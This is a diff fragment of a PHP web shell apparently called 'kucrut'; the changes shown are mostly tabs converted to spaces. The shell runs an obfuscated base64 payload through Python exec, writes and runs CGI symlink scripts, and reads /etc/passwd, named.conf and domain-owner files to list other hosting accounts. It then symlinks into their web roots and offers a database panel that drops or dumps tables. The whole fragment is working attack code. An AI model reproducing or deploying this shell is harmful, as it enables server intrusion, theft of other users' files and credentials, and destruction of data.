4Lg+2K9Y7ZWNAezeZZh8ywcIGzzR7JPhP7M9UWIG2aqTJeepVeNKbnOwNe6XYi+A3U0Fo3mqq8fVbFDIFDJdbWnZTD1T0RAZDAlMHPmuYrpA7CwTAmq0+XQ8j/NeAAYxacf5At3MPpeFVHbKq3bNpZPzyBQr89xst6BxLQgaTbxmVQc+xMisabAgA4Ne5L1+FbzSIpyoVpaM0dhOMEHCTimtmG45EFZjmZERHMXZRP5F0U2oDR0rz+Fy8npMbGQTfyfPonO6z9aq14PmXDgPmlX5Wsw699wPZSP9u7b3xfi9mEYnkYW46glkO0nvQAechHh47/LwJng94JbsuxLwZRss9toSJ+9xHnEZc8CcpQ06Y5NBFlzkDDBkHDlgXUDlrQSAb36l8WXyZqSfmw1gUFFNRoRuFdcAvgZLZ/83zP90BpadwPxOp5h8ndiB8R8Aw98k7QZLB5TwY/1a8PyAuBnsIdRjeC8h6LgzBE5KvUPNXgIBvmIA7aI2mUXzXDAp7QrO6DLBjHj8AZ85ig4A4lPFNrXpxTDDu6BOT3v17/VG8EhGRbYGCQIs0ON+FP/0y18cDAv7MBqE5Es01IZYLAFxhtKK8Mw18zHmQN0fW3rWagugklRROfxpF1oRdgSpXAOQQxsW54twCA4aadiaoSPo8zFcmnbHsju/T3o6xz2watvabyIMp1gMp1m92xY5toRSUdXywWcKC4O43ul4Wg+7geBFb/35dho74CYZTOs3sV6DJ2BA3/TIU3LdIadxAIkeR/PecVj17HjupPnga4Ud8Y/nfj6eCRodL3t5Z6Fo0qQKIIa2+/F6jqb/PBp1RsfT0HSRZqHpfE2z4ULzNXFnm18GFy4PjM6f567fBY8suVcoP5wa7Imy2po0NE01ZKKOk5FlRZ0APt4STsKB94v2+JnYTK7y4+NBg4RObgAJLcs7mIAQX8fbUqUYtqb+O6xxwa7S7610neeWC8Q5Rieo1elWTsrdcmmiQpLfQX7De7LnmB4nUfHlN/UlWpU4aDflKhyG+thzWKG/vXxOoWywpqB4zL6RKw3H8Jz2iQ4xkOxxNGnY57iRxoKjaWdvvjCJB3l3YZQMrZ1eFIEI9rRR2QTkOB6BvY7tnQSbbfouphPTidyTy1vnSJtJTWfneRfTGhqFvJ8vmlp19McnQau7KcCX1LfaPfTqCIOt6UaxiYLfo3cBWWuI5X/BDC8Gvshjh13LkpgjGd7Yu8DRDHcasCjVVZKmuljTFEExTREMvL8TvM7nLdgJ3cmVOtRsQrBnSfA+/1Q9VVMczKb2/C8UKHnLMcyLA7n79f6OPLC730C9XpnqrmdGv+i2J2cZF1QfHBVUy83XaWLWp4kRh6aTxaptb0wbEjaGRdO8eLatFGBOnhfVajIe1fsb23pdLbhSfGPmTOM2Gdd7QHO5BhvfLPVzY7u25VJ3bec9GfY7VztWrNZqsuBlbiZk8RebXP8dJIetz5JDiyhpTn6EPX8uZIEt43+JbZ3IPw7k3we15tU0AdNncPW3ZzEeuQcJu9wPxYZciSXxLru6toECUwT/zuhH3mJkF7M13gtOVpxkc30NE2wpzm/Omm6taJbZo+iN8Qes/YT+fNL+fHD+PFUf9XkvYSpne2jL73lZ8h04+SuIlE/VO31h4uKgCXRQLG9cQ8I8VXd5/gDJZHIJUAzqo17XBJMJf/Djb6Q2SQa0/4LDpYRj+tvkmByb5poQO6cAIHeXOoybeCcKxfpuxcxlJZf4/2Gvq3167Xp3DCfeXwVhexFlXcv2Tgnrp23UEO8m/r3DZCFUT00rd3EwKStYDheGC+jfcQ0Kx5JiKwBC/gejBmkk")),\'<string>\',\'exec\'))';
+    $cginame = "symperl.kucrut";
+    $source = $perl;
+    $lang = "perl";
+    if($_POST["kucrut2"]=="sympy"){
+        $cginame = "pysymlink.kucrut";
+        $source = $py;
+        $lang = "python";
+    }
+    @__write_file($cginame,$source);
+    @chmod($cginame,0755);
+    echo __pre();
+    $resource = kucrutEx("{$lang} {$cginame} {$sympath}",false,true,true);
+    if(strlen($resource) == 0){
+        echo KucrutiFrameCreator('cgikucrut/'.$cginame);
+    }else{
+        echo $resource;
+    }
 }
 if(isset($_POST['kucrut4']) && $_POST['kucrut4']=='SymFile'){
 if(function_exists('symlink')||_kucrut_can_runCommand(true,true)){
@@ -4677,190 +4677,190 @@ $state = $domains["state"];
 $is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
 $can_runcmd = _kucrut_can_runCommand(false,false);
 if(!$is_posix && !$can_runcmd){
-	$anonymous = true;
-	$anony_domains = $domains["lines"];
-	$lines = _kucrut_file('/etc/passwd');
+    $anonymous = true;
+    $anony_domains = $domains["lines"];
+    $lines = _kucrut_file('/etc/passwd');
 }
 echo $table_header;
 $count=1;
 $template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#f20b0b;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__HOST_DATA_FOLDER__.'/kucrutsymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 foreach($lines as $line){
-	$domain = "";
-	$owner = "";
-	if($anonymous){
-		$explode = explode(":", $line);
-		$owner = $explode[0];
-		$owner_len = strlen($owner) - 1;
-		$userid = $explode[2];
-		if((int)$userid < 500)continue;
-		$domain = "[?????]";
-		$temp_black = array();
-		$finded = false;
-		foreach($anony_domains as $anony){
-			if($state == "named.conf"){
-				if(@strstr($anony, 'zone')){
-					preg_match_all('#zone "(.*)"#',$anony, $data);
-					$domain = $data[1][0];
-				}else{
-					continue;
-				}
-			}elseif($state == "named" || $state == "valiases"){
-				if($anony == "." || $anony == "..")continue;
-				if($state == "named")$anony = rtrim($anony, ".db");
-				$domain = $anony;
-			}
-			$sub_domain = str_replace(array("-","."), "", $domain);
-			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
-				if(in_array($owner.$domain, $temp_black))continue;
-				$sympath = str_replace("{user}", $owner, $makepwd);
-				$http = "http://".$domain;
-				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-				$count++;
-				$temp_black[] = $owner.$domain;
-				$finded = true;
-			}
-		}
-		if(!$finded){
-			$anonymous_users[] = $owner;
-		}
-	}else{
- 		if($state == "named.conf"){
-			if(@strstr($line, 'zone')){
-				preg_match_all('#zone "(.*)"#',$line, $data);
-				$domain = $data[1][0];
-			}else{
-				continue;
-			}
-		}elseif($state == "named" || $state == "valiases"){
-			if($line == "." || $line == "..")continue;
-			if($state == "named")$line = rtrim($line, ".db");
-			$domain = $line;
-		}
-		if(strlen(trim($domain)) > 2 && $state != "passwd"){
-			if(!_kucrut_file_exists('/etc/valiases/'.$domain, false))continue;
-			if($is_posix){
-				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
-				$owner = $user["name"];
-			}elseif($can_runcmd){
-				$owner = kucrutEx("stat -c '%U' /etc/valiases/".$domain,false,false);
-			}
-		}
-	}
-	if(!$anonymous){
-		if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "http://".$domain;
-		if($state == "passwd"){
-			$http = "javascript:alert('we cant find domain...')";
-		}
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-		$count++;
-		$f_black[] = $owner.$domain;
-	}
+    $domain = "";
+    $owner = "";
+    if($anonymous){
+        $explode = explode(":", $line);
+        $owner = $explode[0];
+        $owner_len = strlen($owner) - 1;
+        $userid = $explode[2];
+        if((int)$userid < 500)continue;
+        $domain = "[?????]";
+        $temp_black = array();
+        $finded = false;
+        foreach($anony_domains as $anony){
+            if($state == "named.conf"){
+                if(@strstr($anony, 'zone')){
+                    preg_match_all('#zone "(.*)"#',$anony, $data);
+                    $domain = $data[1][0];
+                }else{
+                    continue;
+                }
+            }elseif($state == "named" || $state == "valiases"){
+                if($anony == "." || $anony == "..")continue;
+                if($state == "named")$anony = rtrim($anony, ".db");
+                $domain = $anony;
+            }
+            $sub_domain = str_replace(array("-","."), "", $domain);
+            if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
+                if(in_array($owner.$domain, $temp_black))continue;
+                $sympath = str_replace("{user}", $owner, $makepwd);
+                $http = "http://".$domain;
+                echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
+                $count++;
+                $temp_black[] = $owner.$domain;
+                $finded = true;
+            }
+        }
+        if(!$finded){
+            $anonymous_users[] = $owner;
+        }
+    }else{
+        if($state == "named.conf"){
+            if(@strstr($line, 'zone')){
+                preg_match_all('#zone "(.*)"#',$line, $data);
+                $domain = $data[1][0];
+            }else{
+                continue;
+            }
+        }elseif($state == "named" || $state == "valiases"){
+            if($line == "." || $line == "..")continue;
+            if($state == "named")$line = rtrim($line, ".db");
+            $domain = $line;
+        }
+        if(strlen(trim($domain)) > 2 && $state != "passwd"){
+            if(!_kucrut_file_exists('/etc/valiases/'.$domain, false))continue;
+            if($is_posix){
+                $user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
+                $owner = $user["name"];
+            }elseif($can_runcmd){
+                $owner = kucrutEx("stat -c '%U' /etc/valiases/".$domain,false,false);
+            }
+        }
+    }
+    if(!$anonymous){
+        if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
+        $sympath = str_replace("{user}", $owner, $makepwd);
+        $http = "http://".$domain;
+        if($state == "passwd"){
+            $http = "javascript:alert('we cant find domain...')";
+        }
+        echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
+        $count++;
+        $f_black[] = $owner.$domain;
+    }
 }
 if($anonymous){
-	foreach($anonymous_users as $owner){
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "javascript:alert('we cant find domain...')";
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
-		$count++;
-	}
+    foreach($anonymous_users as $owner){
+        $sympath = str_replace("{user}", $owner, $makepwd);
+        $http = "javascript:alert('we cant find domain...')";
+        echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
+        $count++;
+    }
 }
 $cant_symlink = false;
 }else{
 $is_direct = false;
 $makepwd = kucrutMakePwd();
 if(_kucrut_file_exists("/etc/virtual/domainowners")){
-	$makepwd = "/home/{user}/public_html";
-	$is_direct = true;
+    $makepwd = "/home/{user}/public_html";
+    $is_direct = true;
 }
 $sole = _kucrut_file("/etc/virtual/domainowners");
 $count=1;
 echo $table_header;
 $template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#f20b0b;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__HOST_DATA_FOLDER__.'/kucrutsymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 if($sole){
-	foreach($sole as $visible){
-		if(@strstr($visible,":")){
-			$solevisible = explode(':', $visible);
-			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
-			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
-		}
-	}
+    foreach($sole as $visible){
+        if(@strstr($visible,":")){
+            $solevisible = explode(':', $visible);
+            $cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
+            echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
+        }
+    }
 }else{
-	$passwd = _kucrut_file("/etc/passwd");
-	if($passwd){
-		$html = "";
-		$is_named = false;
-		$users = array();
-		$domains = array();
-		$uknowns = array();
-		foreach($passwd as $user){
-			$user = trim($user);
-			$expl = explode(":", $user);
-			if((int)$expl[2] < 500)continue;
-			$users[$expl[0]] = $expl[5];
-		}
-		$site_domains = @scandir("/etc/virtual/");
-		if(!$site_domains){
-			$site_domains = kucrutEx("ls /etc/virtual/");
-			$site_domains = explode("\n", $site_domains);
-			if(!$site_domains){
-				$site_domains = _kucrut_file("/etc/named.conf");
-				if($site_domains){$is_named = true;}
-			}
-		}
-		foreach($site_domains as $line){
-			if($is_named){
-				if(@strstr($line, 'zone')){
-					preg_match_all('#zone "(.*)"#',$line, $data);
-					$domain = $data[1][0];
-					if(strlen($domain  > 2) && !empty($domain)){
-						$domains[] = $domain;
-					}
-				}
-			}else{
-				$domains[] = $line;
-			}
-		}
-		$x = 1;
-		foreach($users as $user => $home){
-			foreach($domains as $domain){
-				$user_len = strlen($user) - 1;
-				$sub_domain = str_replace(array("-","."), "", $domain);
-				$five_user = substr($user, 0,$user_len);
-				$five_domain = substr($sub_domain, 0,$user_len);
-				if($five_user == $five_domain){
-					if($is_direct){
-						$cwd = str_replace("{user}", $user, $makepwd);
-					}else{
-						$expl = explode("}/", $makepwd);
-						$cwd = $home."/".$expl[1];
-					}
-					$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
-				}else{
-					$uknowns[$user] = $home;
-				}
-			}
-		}
-		$uknowns = array_unique($uknowns);
-		foreach($uknowns as $user => $home){
-			if($is_direct){
-				$cwd = str_replace("{user}", $user, $makepwd);
-			}else{
-				$expl = explode("}/", $makepwd);
-				$cwd = $home."/".$expl[1];
-			}
-			$html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]", $cwd), $template);
-		}
-		echo($html);
-	}
+    $passwd = _kucrut_file("/etc/passwd");
+    if($passwd){
+        $html = "";
+        $is_named = false;
+        $users = array();
+        $domains = array();
+        $uknowns = array();
+        foreach($passwd as $user){
+            $user = trim($user);
+            $expl = explode(":", $user);
+            if((int)$expl[2] < 500)continue;
+            $users[$expl[0]] = $expl[5];
+        }
+        $site_domains = @scandir("/etc/virtual/");
+        if(!$site_domains){
+            $site_domains = kucrutEx("ls /etc/virtual/");
+            $site_domains = explode("\n", $site_domains);
+            if(!$site_domains){
+                $site_domains = _kucrut_file("/etc/named.conf");
+                if($site_domains){$is_named = true;}
+            }
+        }
+        foreach($site_domains as $line){
+            if($is_named){
+                if(@strstr($line, 'zone')){
+                    preg_match_all('#zone "(.*)"#',$line, $data);
+                    $domain = $data[1][0];
+                    if(strlen($domain  > 2) && !empty($domain)){
+                        $domains[] = $domain;
+                    }
+                }
+            }else{
+                $domains[] = $line;
+            }
+        }
+        $x = 1;
+        foreach($users as $user => $home){
+            foreach($domains as $domain){
+                $user_len = strlen($user) - 1;
+                $sub_domain = str_replace(array("-","."), "", $domain);
+                $five_user = substr($user, 0,$user_len);
+                $five_domain = substr($sub_domain, 0,$user_len);
+                if($five_user == $five_domain){
+                    if($is_direct){
+                        $cwd = str_replace("{user}", $user, $makepwd);
+                    }else{
+                        $expl = explode("}/", $makepwd);
+                        $cwd = $home."/".$expl[1];
+                    }
+                    $html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, $domain, $cwd), $template);
+                }else{
+                    $uknowns[$user] = $home;
+                }
+            }
+        }
+        $uknowns = array_unique($uknowns);
+        foreach($uknowns as $user => $home){
+            if($is_direct){
+                $cwd = str_replace("{user}", $user, $makepwd);
+            }else{
+                $expl = explode("}/", $makepwd);
+                $cwd = $home."/".$expl[1];
+            }
+            $html .= str_replace(array("{count}","{user}","{url}", "{cwd}"), array($x++, $user, "[?????]", $cwd), $template);
+        }
+        echo($html);
+    }
 }
 echo "</table>";
 $cant_symlink = false;
 }
 }else{
-	echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
-	$cant_symlink = false;
+    echo "<pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";
+    $cant_symlink = false;
 }
 if($cant_symlink)echo '<pre id="strOutput" style="margin-top:5px" class="ml1"><br><font color="#FFFFFF">Error...</font></b><br>';
 echo "</center></table>";
@@ -4882,11 +4882,11 @@ function connect($host, $user, $pass, $dbname){
 switch($this->type){
 case 'mysql':
 if($this->link = @mysqli_connect($host,$user,$pass,$dbname)){
-	return true;
+    return true;
 }else{
-	$this->mysqli_connect_error = true;
-	$this->mysqli_connect_error_msg = mysqli_connect_error();
-	return false;
+    $this->mysqli_connect_error = true;
+    $this->mysqli_connect_error_msg = mysqli_connect_error();
+    return false;
 }
 break;
 case 'pgsql':
@@ -4996,10 +4996,10 @@ $db = new DbClass($_POST['type']);
 kucruthead();
 $form_visibility = "table";
 if(isset($_POST['sql_host'])){
-	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
-	if($connection_db && !empty($_POST['sql_base'])){
-		$form_visibility = "none";
-	}
+    $connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+    if($connection_db && !empty($_POST['sql_base'])){
+        $form_visibility = "none";
+    }
 }
 $database_list = array();
 echo "
@@ -5023,7 +5023,7 @@ echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>
 }
 echo '</select>';
 }else{
-	echo $tmp;
+    echo $tmp;
 }
 }else
 echo $tmp;
@@ -5034,34 +5034,34 @@ echo "</td>
 </tr>
 </table>";
 if($db->mysqli_connect_error){
-	echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
+    echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
 }
 if(!empty($curr_mysql_id)){
-	$sql_title_db = "";
-	if(!empty($_POST['sql_base'])){
-		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
-	}
-	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."kucrutConnectionHistoryUpdate();</script>";
+    $sql_title_db = "";
+    if(!empty($_POST['sql_base'])){
+        $sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
+    }
+    echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."kucrutConnectionHistoryUpdate();</script>";
 }
 if(isset($db) && $db->link){
 if(!empty($_POST['sql_base'])){
 echo "<div class='mysql-main'><div mode='block' onclick='kucrutMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='kucrutMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='kucrutMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='https://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
 foreach ($database_list as $db_name) {
-	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="kucrutMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="https://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
-	if($db_name == $_POST['sql_base']){
-		$db->selectdb($_POST['sql_base']);
-		$tbls_res = $db->listTables();
-		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="kucrutMysqlFilterTable(this);" name="filter"></div></li>';
-		while($item = $db->fetch($tbls_res)){
-		list($key, $value) = each($item);
-		if(!empty($_POST['sql_count']))
-		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
-		$value = htmlspecialchars($value);
-		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"kucrutLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
-		}
-		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="kucrutMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="kucrutMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="kucrutMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
-	}
-	echo "</div></li>";
+    echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="kucrutMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="https://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
+    if($db_name == $_POST['sql_base']){
+        $db->selectdb($_POST['sql_base']);
+        $tbls_res = $db->listTables();
+        echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="kucrutMysqlFilterTable(this);" name="filter"></div></li>';
+        while($item = $db->fetch($tbls_res)){
+        list($key, $value) = each($item);
+        if(!empty($_POST['sql_count']))
+        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
+        $value = htmlspecialchars($value);
+        echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"kucrutLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
+        }
+        echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="kucrutMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="kucrutMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="kucrutMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
+    }
+    echo "</div></li>";
 }
 echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='kucrutMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='kucrutMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='kucrutMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='kucrutMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='kucrutMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='kucrutMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='kucrutMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
 }
@@ -5074,274 +5074,274 @@ echo '</div>';
 kucrutfooter();
 }
 function kucrutSql_manager_api(){
-	$db = $_POST["kucrut1"];
-	$type = $_POST["kucrut2"];
-	$sql_count = $_POST["kucrut3"] == "true" ? true : false;
-	$db = @json_decode($db, true);
-	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
-	@mysqli_set_charset($conn, "utf8");
-	if($conn){
-		if($type == "load_all_tables"){
-			$tables = array();
-			$q_tables = @mysqli_query($conn, "SELECT `table_schema`, `table_name` FROM `information_schema`.`tables` WHERE `table_schema` IN ('".implode("','", $db["databases"])."');");
-			$count = 0;
-			while($row = @mysqli_fetch_assoc($q_tables)){
-				if($sql_count){
-					$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row["table_schema"].'`.`'.$row["table_name"].'`');
-					if($count_q){
-						$count = @mysqli_fetch_row($count_q);
-						$count = $count[0];
-					}
-				}
-				$tables[$row["table_schema"]][] = array("name" => $row["table_name"], "count" => (int)$count);
-			}
-			foreach($db["databases"] as $db){
-				if(!isset($tables[$db])){
-					$tables[$db] = null;
-				}
-			}
-			echo @json_encode($tables);
-		}elseif($type == "dump_drop"){
-			if($db["mode"] == "drop"){
-				foreach ($db["tables"] as $table) {
-					@mysqli_query($conn, "DROP TABLE `".$table."`;");
-				}
-				$tables = array();
-				$q_tables = @mysqli_query($conn, "SHOW TABLES;");
-				$count = 0;
-				while($row = @mysqli_fetch_array($q_tables)){
-					if($sql_count){
-						$count_q = @mysqli_query($conn, 'SELECT COUNT(*) FROM `'.$row[0].'`');
-						if($count_q){
-							$count = @mysqli_fetch_row($count_q);
-							$count = $count[0];
-						}
-					}
-					$tables[] = array("name" => $row[0], "count" => (int)$count);
-				}
-				echo @json_encode($tables);
-			}else{
-				if(strlen(kucrutEx("mysqldump"))>0){
-					kucrutEx("mysqldump --single-transaction --host=\"".$db["host"]."\" --user=\"".$db["user"]."\" --password=\"".$db["pass"]."\" ".$db["db"]." ".implode(" ", $db["tables"])."  > ".$db["dump_file"]);
-				}else{
-					$fp = @fopen($db["dump_file"], "w");
-					foreach ($db["tables"] as $table) {
-						$res = @mysqli_query($conn, 'SHOW CREATE TABLE `'.$table.'`');
-						$create = @mysqli_fetch_array($res);
-						$sql = "DROP TABLE IF EXISTS `".$table."`;\n" . $create[1].";\n";
-						if($fp) fwrite($fp, $sql); else echo($sql);
-						$tbl_data = @mysqli_query($conn, 'SELECT * FROM `'.$table.'`');
-						$head = true;
-						while($item = @mysqli_fetch_assoc($tbl_data)){
-							$columns = array();
-							foreach($item as $k=>$v) {
-							if($v == null)
-							$item[$k] = "''";
-							elseif(is_numeric($v))
-							$item[$k] = $v;
-							else
-							$item[$k] = "'".@mysqli_real_escape_string($conn, $v)."'";
-							$columns[] = "`".$k."`";
-							}
-							if($head) {
-							$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
-							$head = false;
-							} else
